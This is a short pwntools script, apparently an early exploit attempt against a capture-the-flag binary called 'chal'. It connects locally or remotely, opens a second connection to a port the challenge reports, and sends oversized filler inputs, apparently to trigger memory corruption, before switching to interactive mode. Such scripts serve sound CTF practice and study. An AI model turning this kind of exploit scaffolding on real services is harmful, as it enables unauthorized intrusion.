#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("chal")
libc = e.libc
gs = """
b handle_message 
b handle_command
# brva 0x0181B
brva 0x181B
ida_connect
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p.pid, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()
p.recvuntil(b'Port is ')
port = int(p.recvline().decode())

io1 = remote("localhost", port)
io1.sendlineafter(
    b'Welcome to the network blackhole! What do you want to destroy?\n', b'A'*0x10+b'\n'+b'B'*0x100)

io1.send(b'-'*0x40)
io1.interactive()
p.interactive()
